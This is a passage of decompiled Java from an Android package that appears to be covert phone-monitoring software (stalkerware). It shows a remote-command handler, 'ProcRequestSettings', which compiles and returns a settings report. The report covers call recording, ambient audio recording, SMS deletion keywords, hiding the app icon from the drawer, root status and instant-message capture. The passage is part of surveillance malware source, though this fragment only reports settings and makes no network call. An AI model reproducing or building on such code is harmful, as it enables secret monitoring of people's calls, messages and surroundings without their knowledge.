        localObject1 = String.format((String)localObject2, (Object[])localObject3);
        a(localStringBuilder, (String)localObject1);
      }
      localObject1 = FeatureId.URL_PROFILE;
      bool1 = paramList.contains(localObject1);
      if (bool1)
      {
        localObject1 = FeatureId.URL_PROFILE;
        bool1 = paramRmtCtrlOutputSettings.getFeatureStatus((FeatureId)localObject1);
        localObject2 = "Enable URL Profile:%s";
        localObject3 = new Object[i];
        if (!bool1) {
          break label1623;
        }
        localObject1 = "On";
        label962:
        localObject3[0] = localObject1;
        localObject1 = String.format((String)localObject2, (Object[])localObject3);
        a(localStringBuilder, (String)localObject1);
      }
      localObject2 = new Object[i];
      localObject3 = a(paramRmtCtrlOutputSettings);
      localObject2[0] = localObject3;
      localObject1 = String.format("Running mode:%s", (Object[])localObject2);
      a(localStringBuilder, (String)localObject1);
      localObject1 = FeatureId.CAPTURE_CALL_RECORDING;
      bool1 = paramList.contains(localObject1);
      if (bool1)
      {
        localObject1 = FeatureId.CAPTURE_CALL_RECORDING;
        bool1 = paramRmtCtrlOutputSettings.getFeatureStatus((FeatureId)localObject1);
        localObject2 = "Call recording:%s";
        localObject3 = new Object[i];
        if (!bool1) {
          break label1630;
        }
        localObject1 = "On";
        label1077:
        localObject3[0] = localObject1;
        localObject1 = String.format((String)localObject2, (Object[])localObject3);
        a(localStringBuilder, (String)localObject1);
      }
      localObject1 = FeatureId.SMS_KEYWORD;
      bool1 = paramList.contains(localObject1);
      if (bool1)
      {
        localObject2 = FeatureId.SMS_KEYWORD;
        localObject2 = paramRmtCtrlOutputSettings.getCommonData((FeatureId)localObject2);
        localObject1 = a("SMS deletion keywords", (List)localObject2);
        a(localStringBuilder, (String)localObject1);
      }
      localObject2 = new Object[i];
      localObject3 = j(paramRmtCtrlOutputSettings);
      localObject2[0] = localObject3;
      localObject1 = String.format("Delivery Method:%s", (Object[])localObject2);
      a(localStringBuilder, (String)localObject1);
      localObject1 = FeatureId.CALL_RECORDING_WATCH_NUMBER;
      bool1 = paramList.contains(localObject1);
      if (bool1)
      {
        localObject1 = g(paramRmtCtrlOutputSettings);
        a(localStringBuilder, (String)localObject1);
      }
      localObject1 = FeatureId.CALL_RECORDING_WATCH_NUMBER;
      bool1 = paramList.contains(localObject1);
      if (bool1)
      {
        localObject2 = FeatureId.CALL_RECORDING_WATCH_NUMBER;
        localObject2 = paramRmtCtrlOutputSettings.getCommonData((FeatureId)localObject2);
        localObject1 = a("Call recording watch numbers", (List)localObject2);
        a(localStringBuilder, (String)localObject1);
      }
      localObject2 = new Object[i];
      localObject3 = a();
      localObject2[0] = localObject3;
      localObject1 = String.format("Root status:%s", (Object[])localObject2);
      a(localStringBuilder, (String)localObject1);
      localObject1 = FeatureId.CAPTURE_CALL_RECORDING;
      bool1 = paramList.contains(localObject1);
      if (bool1)
      {
        localObject2 = new Object[i];
        localObject3 = k(paramRmtCtrlOutputSettings);
        localObject2[0] = localObject3;
        localObject1 = String.format("Call recording audio source: %s", (Object[])localObject2);
        a(localStringBuilder, (String)localObject1);
      }
      localObject1 = FeatureId.HIDE_FROM_APP_DRAWER;
      bool1 = paramList.contains(localObject1);
      if (bool1)
      {
        localObject2 = new Object[i];
        localObject3 = l(paramRmtCtrlOutputSettings);
        localObject2[0] = localObject3;
        localObject1 = String.format("Visibility of SuperUser icon:%s", (Object[])localObject2);
        a(localStringBuilder, (String)localObject1);
      }
      localObject1 = FeatureId.AMBIENT_RECORDING;
      bool1 = paramList.contains(localObject1);
      if (bool1)
      {
        localObject1 = FeatureId.AMBIENT_RECORDING;
        bool1 = paramRmtCtrlOutputSettings.getFeatureStatus((FeatureId)localObject1);
        localObject2 = "Temporal control of record audio ambient:%s";
        localObject3 = new Object[i];
        if (!bool1) {
          break label1637;
        }
      }
    }
    label1602:
    label1609:
    label1616:
    label1623:
    label1630:
    label1637:
    for (localObject1 = "On";; localObject1 = "Off")
    {
      localObject3[0] = localObject1;
      localObject1 = String.format((String)localObject2, (Object[])localObject3);
      a(localStringBuilder, (String)localObject1);
      localObject1 = FeatureId.CAPTURE_IM;
      bool1 = paramList.contains(localObject1);
      if (bool1)
      {
        localObject2 = new Object[i];
        localObject3 = m(paramRmtCtrlOutputSettings);
        localObject2[0] = localObject3;
        localObject1 = String.format("IM attachment limit size:%s", (Object[])localObject2);
        a(localStringBuilder, (String)localObject1);
      }
      localObject1 = localStringBuilder.toString();
      boolean bool3 = a;
      if (bool3) {}
      bool3 = a;
      if (bool3) {}
      return (String)localObject1;
      localObject1 = "Off";
      break;
      localObject1 = "Off";
      break label592;
      localObject1 = "Off";
      break label669;
      localObject1 = "Off";
      break label885;
      localObject1 = "Off";
      break label962;
      localObject1 = "Off";
      break label1077;
    }
  }
  
  public void a(RemoteCommand paramRemoteCommand, c paramc)
  {
    boolean bool1 = true;
    boolean bool2 = a;
    if (bool2) {}
    Object localObject1 = paramRemoteCommand.getParameters();
    boolean bool4 = a;
    if (bool4) {}
    int i = ((ArrayList)localObject1).size();
    if (i > 0)
    {
      localObject1 = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      ((InvalidCommanFormatException)localObject1).<init>();
      throw ((Throwable)localObject1);
    }
    boolean bool3 = a;
    if (bool3) {}
    Object localObject2 = h();
    localObject1 = new com/vvt/remotecontrol/ControlCommand;
    Object localObject3 = RemoteFunction.SEND_SETTINGS_EVENT;
    ((ControlCommand)localObject1).<init>((RemoteFunction)localObject3, null);
    bool4 = a;
    if (bool4) {}
    ((com.vvt.remotecontrol.a)localObject2).execute((ControlCommand)localObject1);
    bool3 = a;
    if (bool3) {}
    List localList = com.vvt.remotecontrol.b.a((com.vvt.remotecontrol.a)localObject2);
    bool3 = a;
    if (bool3) {}
    RmtCtrlOutputSettings localRmtCtrlOutputSettings = com.vvt.remotecontrol.b.b((com.vvt.remotecontrol.a)localObject2);
    bool3 = a;
    if (bool3) {}
    localObject1 = new com/vvt/remotecontrol/ControlCommand;
    localObject3 = RemoteFunction.DEBUG_IS_FULL_MODE;
    ((ControlCommand)localObject1).<init>((RemoteFunction)localObject3, null);
    localObject1 = ((com.vvt.remotecontrol.a)localObject2).execute((ControlCommand)localObject1);
    bool4 = localObject1 instanceof Boolean;
    if (bool4)
    {
      localObject1 = (Boolean)localObject1;
      bool3 = ((Boolean)localObject1).booleanValue();
      bool4 = bool3;
    }
    for (;;)
    {
      bool3 = a;
      if (bool3) {}
      localObject1 = new com/vvt/remotecontrol/ControlCommand;
      RemoteFunction localRemoteFunction = RemoteFunction.DEBUG_GET_CONFIG_ID;
      ((ControlCommand)localObject1).<init>(localRemoteFunction, null);
      localObject1 = ((com.vvt.remotecontrol.a)localObject2).execute((ControlCommand)localObject1);
      boolean bool5 = localObject1 instanceof String;
      if (bool5)
      {
        localObject1 = (String)localObject1;
        bool5 = a;
        if (bool5) {}
        localObject2 = "303";
        bool5 = ((String)localObject1).equalsIgnoreCase((String)localObject2);
        if (!bool5)
        {
          localObject2 = "206";
          bool3 = ((String)localObject1).equalsIgnoreCase((String)localObject2);
          if (!bool3) {}
        }
        else
        {
          bool3 = bool1;
        }
      }
      for (;;)
      {
        bool5 = a;
        if (bool5) {}
        localObject1 = a(localRmtCtrlOutputSettings, localList, bool4, bool3);
        if (paramc != null)
        {
          bool4 = a;
          if (bool4) {}
          localObject3 = "%s";
          Object[] arrayOfObject = new Object[bool1];
          arrayOfObject[0] = localObject1;
          localObject1 = String.format((String)localObject3, arrayOfObject);
          paramc.b(paramRemoteCommand, this, (String)localObject1);
        }
        bool3 = a;
        if (bool3) {}
        return;
        bool3 = false;
        localObject1 = null;
        continue;
        bool3 = false;
        localObject1 = null;
      }
      bool4 = false;
      localObject3 = null;
    }
  }
  
  public RemoteCommandProcessor.QueueCategory d()
  {
    return RemoteCommandProcessor.QueueCategory.MAIN;
  }
  
  public String e()
  {
    return "ProcRequestSettings";
  }
  
  public boolean f()
  {
    return true;
  }
  
  public long g()
  {
    return 0L;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/AppEngine1/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */